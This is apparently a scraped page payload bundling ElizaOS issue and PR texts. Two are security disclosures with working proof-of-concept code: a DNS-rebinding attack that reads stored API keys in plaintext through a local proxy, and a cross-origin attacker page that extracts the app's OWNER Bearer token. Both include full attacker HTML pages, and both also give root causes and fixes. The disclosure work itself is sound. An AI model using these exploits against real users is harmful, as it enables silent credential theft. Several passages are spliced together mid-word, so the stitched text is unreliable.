ue.\n15:T2a59,"])</script><script>self.__next_f.push([1,"## Summary\n\nTwo locally-trusting servers started by the desktop app combine into a **DNS rebinding** bypass of the same-origin policy:\n\n1. The **renderer server** (Electrobun main process, `Bun.serve`, `127.0.0.1:5174`) reverse-proxies `/api/*`, `/ws`, `/music-player` to the agent API it spawned on `127.0.0.1:31337`. Before forwarding, it **strips the request's `Host` header** (treated as hop-by-hop) and rewrites it to the loopback target, while passing `Origin` / `Sec-Fetch-*` through. The proxy itself does not validate where a request comes from.\n2. The **agent API** treats every loopback peer as **OWNER, unconditionally** (`isTrustedLocalRequest`).\n\nAn attacker serves a page from a rebinding domain — e.g. `7f000001.\u003cattacker-ip-hex\u003e.rbndr.us`, which alternates A records between the attacker's IP and `127.0.0.1` (TTL 1s). Once the domain resolves to `127.0.0.1`, the attacker's page is **same-origin with the renderer server**, and its GETs flow through the proxy into the agent API: `Host` has been rewritten to loopback, a same-origin GET carries **no `Origin` header**, and `Sec-Fetch-Site` is `same-origin` — every loopback-trust condition is satisfied *legitimately*, so the request is authorized as **OWNER with zero credentials**.\n\nResult: any website can read **all GET endpoints** of the agent API, including:\n\n- `GET /api/secrets/inventory` — enumerates every stored secret (key / label / category / lastModified)\n- `GET /api/secrets/inventory/:key` — returns the secret's **current value in plaintext** (verified: `{\"ok\":true,\"value\":\"sk-…\",\"source\":\"bare\"}`) — e.g. LLM provider API keys\n- `GET /api/secrets` — directory with isSet status + masked values (`maskValue`) for cross-checking\n- `/api/agents`, `/api/plugins`, `/api/rooms`, … — all business data\n\n## Environment\n\n- `@elizaos/app` 2.0.3-beta.7 (commit `876317fb`), Windows 11, default local configuration\n- Attacker needs any domain that can alternate A records (the free `rbndr.us` service works) and an HTTP server on the **same port as the victim's renderer** (default 5174)\n\n## Root cause\n\n**Renderer proxy strips/rewrites Host** — `packages/app/platforms/electrobun/src/renderer-api-proxy.ts:74-92`:\n\n```ts\nconst HOP_BY_HOP_HEADERS = new Set([\n  \"connection\",\n  \"keep-alive\",\n  \"host\",   // ← the request's Host is dropped, then rewritten to the loopback proxy target\n  ...\n]);\n```\n\n**Agent API: loopback peer = unconditional OWNER** — `packages/agent/src/api/server-helpers-auth.ts:348-364`:\n\n```ts\nif (isTrustedLocalRequest(req)) return true;   // loopback peer → OWNER, no credentials\n```\n\n`isTrustedLocalRequest` (`packages/core/src/security/loopback-trust.ts:374-416`) bases the decision entirely on request properties: loopback TCP peer, no proxy-client-IP headers, loopback `Host`, `Sec-Fetch-Site` ∈ {missing, same-origin, none}, `Origin` absent-or-trusted (`isTrustedLocalOrigin`, :347-360, passes when `Origin` is missing). This correctly blocks **direct** cross-site requests to `:31337` (`Sec-Fetch-Site: cross-site` → 403) — but after a rebind, the browser's request *is* same-origin, so it passes.\n\nThe secrets endpoints are gated on OWNER only — e.g. `packages/app/src/api/secrets-inventory-routes.ts:124` (`ensureRouteMinRole(..., \"OWNER\")`), `packages/agent/src/api/plugin-management-routes.ts:280-291` — and a rebound request **is** OWNER. (Additionally, `packages/agent/src/api/media-runtime.ts:92-115` marks media routes `public: true`.)\n\nAttack chain:\n\n```\nattacker domain (A record → attacker) serves the malicious page\n  → TTL expires, domain resolves to 127.0.0.1 (rbndr.us alternates both IPs, TTL 1s)\n  → page is now same-origin with the renderer (127.0.0.1:5174)\n  → same-origin GET fetch(\"/api/secrets/inventory/\u003ckey\u003e\")\n  → renderer proxy strips Host, forwards → agent API (127.0.0.1:31337)\n  → loopback peer + rewritten Host + GET without Origin → trusted → OWNER\n  → 200 {\"ok\":true,\"value\":\"sk-…\"} — plaintext API key, readable same-origin\n```\n\n## Steps to reproduce\n\n\u003e DNS rebinding requires the attacker page to be served on the **same port** the victim's renderer listens on (default 5174, from any non-loopback IP — a second machine, or another NIC/LAN IP on the same machine).\n\n1. **Attacker side:** save the PoC below as `poc.html` and serve it on port 5174 (`python -m http.server 5174`).\n2. Build the rebinding domain: `7f000001.\u003cattacker-ip-hex\u003e.rbndr.us` — e.g. attacker `192.168.1.10` → hex `c0a8010a` → `7f000001.c0a8010a.rbndr.us` (`7f000001` = 127.0.0.1).\n3. **Victim side:** start the desktop app (default config), browse to `http://7f000001.c0a8010a.rbndr.us:5174/poc.html`, click \"Start\".\n4. The page polls a relative GET every 900 ms (≤90 tries). While DNS points at the attacker it just gets the PoC page back (or 404); once it flips to `127.0.0.1` you get `REBIND HIT`, and the page reads `/api/secrets/inventory`, `/api/secrets/inventory/\u003ckey\u003e` (plaintext), `/api/agents`, `/api/plugins`, `/api/rooms` — all HTTP 200, bodies fully readable (same-origin).\n\nMinimal PoC (any page on the rebinding domain, after the DNS flip):\n\n```js\nconst keys = await (await fetch(\"/api/secrets/inventory\", { cache: \"no-store\" })).json(); // enumerate stored secrets\nconst r = await fetch(\"/api/secrets/inventory/ANTHROPIC_API_KEY\", { cache: \"no-store\" }); // same-origin GET, no Origin header\nconst data = await r.json(); // {\"ok\":true,\"value\":\"sk-…\",\"source\":\"bare\"} — plaintext API key\n```\n\nSelf-contained PoC page:\n\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\u003cmeta charset=\"UTF-8\"\u003e\u003ctitle\u003eattacker rebind page\u003c/title\u003e\u003c/head\u003e\n\u003cbody style=\"background:#0d1117;color:#c9d1d9;font-family:Consolas,monospace;padding:24px\"\u003e\n\u003ch2\u003eElizaOS Desktop — DNS rebinding unauthorized-read PoC (this page is the \"attacker website\")\u003c/h2\u003e\n\u003cp\u003eTarget endpoint:\n\u003cselect id=\"target\"\u003e\n  \u003coption value=\"/api/secrets/inventory/ANTHROPIC_API_KEY\"\u003e/api/secrets/inventory/:key (plaintext API key)\u003c/option\u003e\n  \u003coption value=\"/api/secrets/inventory\"\u003e/api/secrets/inventory (enumerate secrets)\u003c/option\u003e\n  \u003coption value=\"/api/secrets\"\u003e/api/secrets (directory: isSet + masked values)\u003c/option\u003e\n  \u003coption value=\"/api/agents\"\u003e/api/agents\u003c/option\u003e\n  \u003coption value=\"/api/plugins\"\u003e/api/plugins\u003c/option\u003e\n  \u003coption value=\"/api/rooms\"\u003e/api/rooms\u003c/option\u003e\n\u003c/select\u003e\n\u003cbutton onclick=\"rebind()\"\u003eStart DNS rebinding unauthorized read\u003c/button\u003e\u003c/p\u003e\n\u003cpre id=\"log\" style=\"background:#010409;border:1px solid #30363d;padding:12px;min-height:160px\"\u003e\u003c/pre\u003e\n\u003cscript\u003e\nconst log = (m, c) =\u003e {\n  const d = document.createElement('div');\n  d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + m;\n  d.style.color = c || '#c9d1d9';\n  document.getElementById('log').appendChild(d);\n};\nlet scanning = false;\nasync function rebind() {\n  if (scanning) return;\n  if (location.protocol === 'file:') { log('[x] Open this page over http:// via the rbndr domain (file:// cannot rebind)', '#ff7b72'); return; }\n  if (/^(127\\.|localhost|\\[::1\\])/.test(location.hostname))\n    log('[!] Warning: you are on a loopback hostname — a same-origin read is not evidence; use the rbndr domain', '#d29922');\n  const target = document.getElementById('target').value;\n  scanning = true;\n  log('[*] Page origin: ' + location.origin + ' (the domain alternates attacker-IP \u003c-\u003e 127.0.0.1, TTL 1s)', '#8b949e');\n  let hit = false;\n  for (let i = 1; i \u003c= 90 \u0026\u0026 !hit; i++) {\n    try {\n      const r = await fetch(target, { cache: 'no-store', referrerPolicy: 'no-referrer' });\n      const body = await r.text();\n      if (r.status === 200 \u0026\u0026 body.length \u003e 0 \u0026\u0026 !/attacker rebind page/.test(body)) {\n        // response is no longer this PoC itself (the attacker side serves this page) -\u003e rebound to 127.0.0.1\n        hit = true;\n        log('[*] REBIND HIT @ try ' + i + ': ' + target + ' -\u003e HTTP ' + r.status + ' (now same-origin with 127.0.0.1:' + location.port + ')', '#ff7b72');\n        log('[+] First 500 bytes of the response:', '#3fb950');\n        log('    ' + body.slice(0, 500), '#8b949e');\n        if (target.indexOf('/api/secrets/inventory/') === 0 \u0026\u0026 /\"value\"\\s*:/.test(body))\n          log('[*] Plaintext API key read without authorization — ' + body, '#ff7b72');\n        log('[*] Impact: a page on the attacker domain reads agent API GET data as OWNER, with no credentials', '#ff7b72');\n      } else {\n        log('[-] try ' + i + ': HTTP ' + r.status + ' (DNS currently on the attacker side / got the PoC page itself)', '#8b949e');\n      }\n    } catch (e) {\n      log('[-] try ' + i + ': network error (DNS currently on the attacker side, or connection refused)', '#8b949e');\n    }\n    await new Promise(s =\u003e setTimeout(s, 900));\n  }\n  if (!hit) log('[x] No hit in 90 tries. Check: do the attacker server and the victim renderer use the same port (both 5174)? Is the rbndr domain correct?', '#ff7b72');\n  scanning = false;\n}\n\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Negative control (what already works)\n\n- From an ordinary website: `fetch(\"http://127.0.0.1:5174/api/...\")` → the browser attaches `Sec-Fetch-Site: cross-site` → the agent API returns **403**.\n- Direct request to `:31337` with a stolen Bearer token → **403**.\n- Only the rebinding path succeeds without credentials — the agent API does defend against direct cross-site access; the gap is the **renderer proxy chain**.\n\n## Impact (and honest scope)\n\n- Through this path a browser obtains **read-only OWNER access**: all GET endpoints, including stored secrets in plaintext.\n- **Writes are blocked**: POST/PUT/DELETE from the browser carry `Origin` → 403. No write/RCE from the browser via this issue alone.\n- Plaintext reads only cover secrets the victim has actually stored.\n- Requires an attacker-controlled domain (free `rbndr.us` suffices) and the same port as the renderer (default 5174; if the renderer increments, the attacker port follows).\n- The rebind usually lands within ~10 s of polling (90 × 900 ms window).\n- Chrome LNA, if enforced, would block page→127.0.0.1 requests; default Chrome/Firefox today are affected.\n\n## Suggested fix\n\n1. **Validate `Host` in the renderer proxy** (`renderer-api-proxy.ts`): only forward requests whose `Host` is the expected loopback host (`127.0.0.1:5174` / `localhost:5174`); reject everything else. This is the standard DNS-rebinding mitigation — during a rebind attack the Host is the attacker's domain.\n2. **Add a shared secret between the renderer proxy and the agent API**, so \"can connect to :5174\" no longer equals OWNER; loopback trust should not rest on forgeable/satisfiable headers alone.\n3. **Never return secret plaintext from `/api/secrets/inventory/:key`** — return masked values or decrypt on explicit request, so even a bypassed OWNER read yields no key material.\n4. Defense in depth: reject non-loopback `Host`/`Origin` outright in the loopback-trust check."])</script><script>self.__next_f.push([1,"16:T19a3,"])</script><script>self.__next_f.push([1,"## Summary\n\nThe ElizaOS desktop app starts a local **renderer HTTP server** (Electrobun main process, `Bun.serve`, default `127.0.0.1:5174`, incrementing if taken). Two flaws on this server combine:\n\n1. **Every static response is served with `Access-Control-Allow-Origin: *`** — JavaScript on any website can read the response bodies cross-origin.\n2. **The built-in index page embeds the app's boot config in plaintext**, including the agent API's **OWNER-level Bearer token (`apiToken`)** and its base URL (`apiBase`).\n\nSo if the victim simply opens any attacker-controlled web page while the desktop app is running, that page performs one plain cross-origin GET (a simple request, **no preflight**) to `http://127.0.0.1:5174/`, reads the full HTML, and extracts the OWNER token with a regex. Zero interaction, no dialogs, completely silent — the app's highest-privilege credential is handed to an arbitrary website.\n\n## Environment\n\n- `@elizaos/app` 2.0.3-beta.7 (commit `876317fb`), Windows 11, default local configuration (no special settings)\n\n## Root cause\n\n`packages/app/platforms/electrobun/src/index.ts` — static-file handling of the renderer server:\n\n```ts\n// index.ts:915-933 — HTML branch\nif (mimeExt === \".html\" || filePath.endsWith(\"index.html\")) {\n    const html = apiBaseOwner.injectIntoHtml(content.toString(\"utf8\"));  // :925 — injects apiToken + apiBase into the page\n    return new Response(html, {\n        headers: {\n            \"Content-Type\": \"text/html; charset=utf-8\",\n            \"Access-Control-Allow-Origin\": \"*\",                           // :929 — any origin may read this\n            \"Cache-Control\": \"public, max-age=0, must-revalidate\",\n        },\n    });\n}\n```\n\n```ts\n// index.ts:934-937 — all other static assets\nconst headers: Record\u003cstring, string\u003e = {\n    \"Content-Type\": getRendererAssetContentType(mimeExt),\n    \"Access-Control-Allow-Origin\": \"*\",                                   // :936\n    ...\n};\n```\n\nEither flaw alone would be harmless (no token embedded → nothing to steal; no `ACAO: *` → body unreadable cross-origin). Together, the OWNER credential leaves the victim's machine into the attacker's page context.\n\n## Steps to reproduce\n\n1. Start the desktop app (default config). The renderer listens on `127.0.0.1:5174`.\n2. Open any other web page (any http/https origin — even `file://` works, which is convenient for verification) and run this from the browser console:\n\n```js\nconst r = await fetch(\"http://127.0.0.1:5174/\", { cache: \"no-store\" });\nconst html = await r.text();\nconsole.log(r.headers.get(\"access-control-allow-origin\")); // \"*\"  (cross-origin read allowed)\nconsole.log(html.match(/apiToken:\"([0-9a-fA-F]+)\"/)[1]);   // the OWNER-level Bearer token\nconsole.log(html.match(/apiBase:\"([^\"]+)\"/)[1]);           // e.g. http://127.0.0.1:31337\n```\n\n3. The console prints the OWNER token.\n\nSelf-contained attacker page (save as `.html`, open in a browser on the victim machine, click the button):\n\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\u003cmeta charset=\"UTF-8\"\u003e\u003ctitle\u003eattacker page\u003c/title\u003e\u003c/head\u003e\n\u003cbody style=\"background:#0d1117;color:#c9d1d9;font-family:Consolas,monospace;padding:24px\"\u003e\n\u003ch2\u003eElizaOS Desktop — cross-origin OWNER token theft PoC (this page is the \"attacker website\")\u003c/h2\u003e\n\u003cp\u003eRenderer port (default 5174): \u003cinput id=\"port\" value=\"5174\" style=\"width:80px\"\u003e\n\u003cbutton onclick=\"steal()\"\u003eSteal OWNER token (cross-origin)\u003c/button\u003e\u003c/p\u003e\n\u003cpre id=\"log\" style=\"background:#010409;border:1px solid #30363d;padding:12px;min-height:120px\"\u003e\u003c/pre\u003e\n\u003cscript\u003e\nconst log = (m, c) =\u003e {\n  const d = document.createElement('div');\n  d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + m;\n  d.style.color = c || '#c9d1d9';\n  document.getElementById('log').appendChild(d);\n};\nasync function steal() {\n  const port = document.getElementById('port').value.trim() || '5174';\n  log('[*] Target: http://127.0.0.1:' + port + '/  (plain GET, no preflight, any origin may send it)', '#8b949e');\n  try {\n    const r = await fetch('http://127.0.0.1:' + port + '/', { cache: 'no-store' });\n    log('[+] HTTP ' + r.status, '#3fb950');\n    const acao = r.headers.get('access-control-allow-origin');\n    log(acao === null ? '[-] No ACAO header (this port may not be the renderer)'\n                      : '[+] Access-Control-Allow-Origin: ' + acao, acao === '*' ? '#ffa657' : '#d29922');\n    const html = await r.text();\n    log('[+] Cross-origin body read succeeded, ' + html.length + ' bytes', '#3fb950');\n    const tk = html.match(/apiToken:\"([0-9a-fA-F]+)\"/);\n    const ab = html.match(/apiBase:\"([^\"]+)\"/);\n    if (tk) log('[+] Stolen OWNER Bearer token: ' + tk[1], '#ffa657');\n    if (ab) log('[+] apiBase: ' + ab[1], '#ffa657');\n    if (tk \u0026\u0026 ab) log('[*] Impact: a malicious website has obtained the agent API OWNER credential with zero interaction', '#ff7b72');\n  } catch (e) {\n    log('[-] Request failed: ' + e.message, '#ff7b72');\n  }\n}\n\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Expected / actual\n\n- **Expected:** an external origin cannot read the local renderer's responses, and the OWNER token is never exposed to web content.\n- **Actual:** `ACAO: *` lets any origin read the index HTML, which contains the OWNER Bearer token in plaintext.\n\n## Impact (and honest scope)\n\n- The agent API's **OWNER credential itself is exfiltrated** to any website the user visits — zero interaction beyond opening a page.\n- Directly replaying **write** requests (POST/PUT) from the browser with the stolen token is rejected with 403: the agent API's loopback-trust check refuses requests carrying an untrusted `Origin` header (`packages/core/src/security/loopback-trust.ts:347-416`). The damage here is the credential leaving the machine, plus chaining with any local process or other issues — a local process holding this token can call the full API as OWNER.\n- Chrome's Local Network Access (LNA), if enforced, would block page→127.0.0.1 requests; default Chrome/Firefox today are affected.\n- Not applicable in external/cloud connection mode (no `apiToken` embedded there).\n\n## Suggested fix\n\n1. **Remove `Access-Control-Allow-Origin: *`** from static responses (`index.ts:929`, `index.ts:936`). The desktop UI does not need to be readable by arbitrary web origins.\n2. **Don't embed the long-lived OWNER token in the HTML** (`injectIntoHtml`): deliver it via one-time runtime IPC, or use short-lived per-session credentials bound to the app's own processes.\n3. If the UI must be served over HTTP, put an **Origin allowlist** on the renderer server (app protocol / loopback same-origin only)."])</script><script>self.__next_f.push([1,"17:Ta14,"])</script><script>self.__next_f.push([1,"Run the existing agent on Alpha’s AWS Nitro Enclave.\n\n## Detailed Description\n\n**Estimate:** 4 working days, September 14–17 (deployment, performance verification and attestation). **Needs:** Alpha deployment access and its network/storage adapters. Context optimization is not a blocker.\n\n- Package the working agent deployment for Alpha’s enclave setup.\n- Connect ingress, outbound model/speech requests and durable storage through Alpha’s supported adapters.\n- Use remote text, STT and TTS providers outside the TEE. This is the accepted architecture. Disable local models in this profile.\n- Preserve the agent’s account binding and provide the endpoint/auth contract needed by phone pairing.\n\nAlpha must supply the enclave build recipe, network/storage adapters, access and provider configuration. Reuse the current host.\n\n- Record the execution location of the agent, models, speech services and storage.\n- Verify the deployed workload fits the available memory and survives cold/warm startup.\n- Verify complete context, provider failures and restart recovery. Record resource pass/fail; identify external inference as external. Voice latency already meets the target and adds no work here.\n\nPerformance work from #31019 and attestation from #31020 are consolidated here.\n\n- Reuse Alpha’s Nitro/NSM and KMS integration. Connect verif "])</script><script>self.__next_f.push([1,"**Describe the bug**\n\n`/api/status`, `/api/health` and the WebSocket status payload report `canRespond: true` on two runtimes whose first turn cannot be served, because `computeCanRespond` counts the local-inference router as a text provider.\n\n- `computeCanRespond` (`packages/agent/src/api/health-routes.ts:468`) asks `hasTextGenerationHandler(runtime)`, which is satisfied by any registration on a text slot. The local-inference plugin registers `eliza-router` on every text slot (`plugins/plugin-local-inference/src/services/router-handler.ts`, `installRouterHandler`). The router serves nothing itself: it dispatches to the other registered handlers, and with none it throws `NoModelProviderConfiguredError` (`router-handler.ts:488-490`, \"No provider registered for TEXT_LARGE. Configure a cloud provider, enable local inference, or pair a device.\"). A runtime whose text slots hold only the router therefore reports `canRespond: true` while every turn fails. That shape is produced in practice: with `ELIZA_DEVICE_BRIDGE_ENABLED=1` and no device attached, `ensureLocalInferenceHandler` installs the router and returns before registering any text handler (`plugins/plugin-local-inference/src/runtime/ensure-local-inference-handler.ts:1784-1797`).\n- `isCloudTextModelUnavailable` (`health-routes.ts:640-644`) gates chat only when every provider registered for a missing Cloud model type is `elizaOSCloud`. On a host where the router sits beside Cloud alone, `providers` is `[\"eliza-router\", \"elizaOSCloud\"]`, so a positive catalog answer that the Cloud model is missing never gates chat, although the router's only candidate is that same Cloud handler.\n\n`readLocalTextModelReadiness` already leaves the router out of its registration filter (`health-routes.ts:500-506`, since #32953). The two checks above do not. The #32953 review recorded both as non-blocking findings; this issue is the follow-up.\n\n**To Reproduce**\n\nOn `origin/develo xt_f.push([1,"## Defect\n\n`redactLogValue` in `packages/core/src/security/log-redaction.ts` keeps every visited object in a single never-pruned `WeakSet` (`seen.add` with no `delete`). Every log sink that goes through it (core logger metadata and trailing args, `packages/ui/src/logger.ts`, cloud `redactLogArgs`) prints the second reference to any shared, non-cyclic object as `[Circular]`.\n\nReproduced on develop `b4eb27576f` through the real core logger:\n\n```ts\nconst owner = { id: \"u1\", name: \"Ada\", apiKey: \"sk-live-fixture\" };\nlogger.info({ requester: owner, assignee: owner }, \"probe-shared-reference\");\n// recentLogs(): ... requester={\"id\":\"u1\",\"name\":\"Ada\",\"apiKey\":\"[REDACTED]\"}, assignee=[Circular]\n```\n\nAlso: `{ error, lastError: error }` drops the second error; `[tag, tag, tag]` logs one tag and two `[Circular]` markers.\n\n## Authority\n\nThis is the logger site of #25125, consolidated into #31004 on 2026-09-14 (\"explicitly includes logger redaction … remains a real unresolved bug\"). #31004 closed on 2026-09-27 after three other sites were fixed; the logger walker moved to `packages/core/src/security/log-redaction.ts` in the restructure and was not among them.\n\n## Acceptance\n\n- Shared references render in full (and redacted) at every position; true cycles still collapse to `[Circular]`.\n- The walk stays bounded on densely shared graphs (e.g. an HTTP client error carrying its request/socket/agent).\n- Regression tests on the real walker.\n\nFix: #33045\n"])</script><script>self.__next_f.push([1,"28:T6ee,"])</script><script>self.__next_f.push([1,"### What happens\n\n`buildSelfControlBlockPolicy` in `plugins/plugin-blocker/src/services/website-blocker/engine.ts` only adds a `www.` entry when the requested host has exactly two labels (`shouldAddWwwVariant`, line 1010). It also looks up the per-site policy group by the literal requested host (line 260). As a result the block silently leaves the site reachable in three common cases:\n\n1. **Country-code registrable domains.** Blocking `bbc.co.uk`, `amazon.co.uk` or `abc.net.au` adds no `www.` entry, but these sites serve from `www.`.\n2. **Requests that name the www host.** Blocking `www.example.com` (or a pasted `https://www.example.com/`) never blocks `example.com`.\n3. **www requests for a site with a policy group.** Blocking `www.twitter.com` blocks only that host. The Twitter/X group that a `twitter.com` request gets (x.com, t.co, twimg hosts and others) is skipped, and twitter.com redirects to x.com, so the block has no practical effect.\n\nIn each case the block reports itself as active while the site stays open.\n\n### Repro\n\n```ts\nimport { buildSelfControlBlockPolicy } from \"./engine\";\n\nbuildSelfControlBlockPolicy([\"example.co.uk\"]).blockedWebsites;\n// [\"example.co.uk\"]     (no www.example.co.uk)\n\nbuildSelfControlBlockPolicy([\"www.example.com\"]).blockedWebsites;\n// [\"www.example.com\"]   (no example.com)\n\nbuildSelfControlBlockPolicy([\"www.twitter.com\"]).blockedWebsites;\n// [\"www.twitter.com\"]   (a \"twitter.com\" request yields 13 hosts, including x.com and t.co)\n```\n\n### Expected\n\nA registrable domain and its `www.` host should be treated as one site. Both should be blocked whichever one was named, and the site's policy group should apply. Other subdomains such as `news.example.co.uk` or `sub.example.org` should keep blocking only themselves.\n"])</script><script>self.__next_f.push([1,"29:Tdc8,"])</script><script>self.__next_f.push([1,"## Problem\n\nThe native cloud gateway (`packages/auth/native-host/cloud-services/cloud-services.mjs`) reads the saved pending sign-in journal in three places with three different levels of parse discipline, and two of them violate the contract the other readers establish.\n\n1. **`accountAccess` (the `GET /cloud/account/access` reader) parses the journal unguarded:**\n\n```js\nconst pending = await pendingCredentialStore?.read();\nif (pending \u0026\u0026 JSON.parse(pending).kind === \"revocation\")\n```\n\nA journal that is unparseable **after startup** (partial write, editor, sync tool — `ready` already resolved with valid bytes, so the per-request read is what sees the corruption) throws a raw `SyntaxError` through the route boundary, which maps it to **502 `{\"error\":\"Cloud service unavailable\"}`**. Every sibling reader of the same bytes returns the designed **409 `savedSignInNeedsAccountRecovery`** account-recovery state instead (`ready`, `usableCredential`, and three sites in `cloud-enrollment.mjs`). The account panel therefore renders a transient-looking provider outage that invites endless retry instead of the recovery path.\n\n2. **`ready` and `usableCredential` parse guarded but then dereference `.kind` on whatever parsed:**\n\n```js\ntry { saved = JSON.parse(raw); } catch { throw fail(message(\"savedSignInNeedsAccountRecovery\"), 409); }\nif (saved.kind === \"revocation\") ...\n```\n\nA journal that parses to `null` or a primitive (the string `\"null\"` is exactly what `/cloud/status`'s own reader is written to tolerate: `JSON.parse(pending ?? \"null\")?.kind`) makes `ready` reject with a `TypeError` **outside its try**, so `await ready` fails on **every** `/cloud/*` route with 502 `Cloud service unavailable` — including `/cloud/status`, whose own parse would have treated the same bytes as benign.\n\n## Reproduction (current `develop`)\n\n`develop` `9ffc6f626c02dbf5bdba09911f91c2bbf488fad4`; `cloud-services.mjs` blob `855478cebe3b56feda4ddc6b10bd6962e043b8fa`.\n\nDriving `createCloudRoutes` over a real loopback HTTP server with an in-memory `pendingCredentialStore`:\n\n- Store returns `null` at startup, then `\"{not json\"` before `GET /cloud/account/access` → **502** `{\"error\":\"Cloud service unavailable\"}` (expected 409 `savedSignInNeedsAccountRecovery`; `GET /cloud/account/invoices` through `usableCredential` already 409s on the same bytes).\n- Store returns the string `\"null\"` from startup → `GET /cloud/status` → **502** on every route via the `ready` rejection (expected: benign `disconnectPending: false`, matching the route's own `JSON.parse(pending ?? \"null\")?.kind` reader).\n\n## Acceptance criteria\n\n- A pending journal that is unparseable at request time makes `/cloud/account/access` return the 409 `savedSignInNeedsAccountRecovery` state, never a 502 outage.\n- A journal that parses to `null`/a primitive is benign everywhere: no route fails in `ready`, `usableCredential`, or `accountAccess`; `/cloud/status` keeps reporting `disconnectPending: false`.\n- The malformed-parse catch is documented as error-policy:J3 (explicit invalid state, never a fake-valid default).\n- Regression tests drive the real route handler over HTTP with a mutable pending store; `node --test native-host/cloud-services/*.test.mjs` and `node --test native-host/*.test.mjs` pass.\n\n## Duplication check\n\nOpen issue/PR searches for `savedSignInNeedsAccountRecovery`, `pendingCredentialStore`, and `cloud-services` found no matching work. #33272/#33273 hardened `projectCheckout` in this file; nothing touches the journal readers."])</script><script>self.__next_f.push([1,"2a:T4d6,Promote the reviewed core, host, contracts, voice, app, UI and testing integration and its follow-up repairs to staging. The merge preserves staging history and produces exactly the develop tree at 512f789580b86e885a1654ea28e8ff20e0990922.\n\nResolutions retain the packaged Kokoro worker and caller-owned initialization tests, declarative script lanes, ordered HTTP server shutdown, Notes migration and account-scoped Gmail regressions. The promotion also includes private native file publication, staging session PKCE, guarded Cloud diagnostic errors, the retired Turbo-task cleanup and the strict billing-hold audit fixture.\n\nLocal qualification: full root verify passed all 297 tasks and repository audits; 5,501 UI tests; 218 app visual checks plus OCR with zero broken views; 27 deterministic scenarios; 8 GEPA tests; 3 Clou tion is claimed.\n"])</script><script>self.__next_f.push([1,"5e:Tba0,"])</script><script>self.__next_f.push([1,"Interrupted organization upgrades now have an authenticated cron recovery lane. Each due command gets an exclusive observation lease before searching for a missing original invoice, with exponential retry delay capped at one hour. Fenced organizations are excluded from the batch. Original-invoice discovery exhausts the fixed authorized event window, preserves invalid/repeated cursor errors and provider failures, and uses the configured SDK transport policy. The separate total-read, per-request, batch timers and 100-page source ceiling have been removed; canonical observation and settlement lease fences remain.\n\nPer-command uncertainty is retained in the existing financial incident journal without raw provider content. Repeated failures deduplicate; only an applied command resolves its incidents, and a late error cannot reopen them. A journal failure fails the maintenance lane, while ordinary pending payment remains pending. Other Stripe maintenance lanes continue independently.\n\nCurrent repair head `76e6ceced9d93595bd7d2f82fc8679b3fe8952a9`: 19 focused invoice-search/maintenance cases passed (38 assertions), and owning Biome passed for all five changed surviving files. Controls cover an original receipt beyond page 100, a conflicting invoice beyond page 100, repeated healthy 25-second logical-clock traversals within the observation lease, and admitting the next due command after a healthy prior observation. The two targeted controls fail on the original maintenance head. These controlled tests do not certify real elapsed transport, PostgreSQL settlement, or live Stripe acceptance. Current-head shared/API types, actual database integration, full root verification and hosted gates remain pending; keep this PR draft until required gates pass.\n\nEarlier author-reported validation applies to the original `734ba82753b8760f456f34650214d00e660ba6e4`, before t QL execution cases (19 assertions), shared typecheck, Biome and workflow policy pass. PostgreSQL covers paid publication, lost response, pending payment, authority revocation before dispatch and actor removal after the effect. The final API build including the tracked database tests passes with the CI 8 GB Node heap setting. Full root verification is running at the committed head. Synthetic provider objects are not live Stripe acceptance.\n\nThe branch includes the merged PR33549 assertion typing repair from develop. Still required: pre-dispatch failure disposition and public confirmation, authenticated invoice-origin recovery, webhook/cron ownership, pending/SCA/expired outcomes, renewal-boundary recovery, scheduled downgrade and product integration.\n"])</script><script>self.__next_f.push([1,"60:Tbb9,"])</script><script>self.__next_f.push([1,"External Android consumers currently duplicate APK installation, instrumentation parsing and cleanup. This adds an explicit consumer harness in the app tooling and factors instrumentation identity decoding from the existing AAPT manifest parser.\n\nThe harness validates every APK package and test runner/target before installation, verifies the caller-selected disposable AVD name, Android user, ABI and SELinux policy, refuses existing or retained package data across users, and uses the canonical device lease. Installation never uses replacement mode. Exact APK hashes, complete instrumentation, owned-package cleanup and unchanged HOME are recorded.\n\nReview revisions:\n- ADB and AAPT calls are asynchronous and accept the caller's AbortSignal and optional command/instrumentation deadlines. There is no default duration policy or 120–600-second gate.\n- Cleanup ignores the cancelled operation signal, force-stops owned targets in the selected Android user, uninstalls owned packages, and uses an independent optional caller cleanup deadline.\n- Callbacks receive cancellation and must cooperate before returning. The canonical lease f rently live in Senior Care despite using the shared app task runtime and personal-assistant stores. This moves that facade into `plugin-personal-assistant/native-host/bill-task-routes.mjs` with host-supplied workflow policy and presentation strings.\n\nThe route composition preserves owner/epoch reauthorization, durable choice deduplication, complete source selection and outcome restoration. It reuses the caller's SQLite stores and task runtime. Product helper descriptions, support/study endpoints and wording remain in the consumer.\n\nValidation: all 55 owning bill-host tests pass, including actual HTTP/SQLite choice concurrency, logout during workflow authorization and source selection/reread/durable restoration. Changed-file Biome passes. Both initial and final root verification pass (287 tasks and final audits). Review revisions add coverage for actor/epoch changes and cancellation at response delivery, plus a saved-outcome repeat POST. Both reauthorization/outcome-short-circuit mutations now fail those tests; the cancellation case first reproduced a returned response and passes after adding the signal check. These controlled tests do not establish live biller or payment acceptance.\n62:T5ca,"])</script><script>self.__next_f.push([1,"Scheduled-cancellation reversal needs an account-specific renewal estimate; the public plan catalog cannot establish the next invoice amount. Add a read-only manager route that previews reversal using the pinned Stripe API, retains the subscription's catalog version and lifecycle revision, and exposes tax, discount, balance and amount-due fields without provider identifiers.\n\nThe review validates primary actor/source/entitlement/command authority before and after provider I/O. It rejects mixed or incomplete invoice lines, inconsistent totals, changed scope/period and unfinished automatic tax. Reviews expire after at most 60 seconds. This creates no command or provider mutation; its fingerprint is not an authorization token. Binding reviewed terms to an undo command remains a separate required change before consumer confirmation is enabled.\n\nValidation: 6 focused PGlite/service tests (39 assertions), 5 HTTP boundary tests, full shared suite, all 66 isolated API test files, final shared typecheck, API typecheck/router/Worker dry-run, changed-file Biome and root `bun run verify` pass locally. The final root verification also passes after the scanner-only follow-up. The initial hosted scanner finding was the explicitly invented controlled-provider test sentinel; the follow-up allows only its exact assignment in its 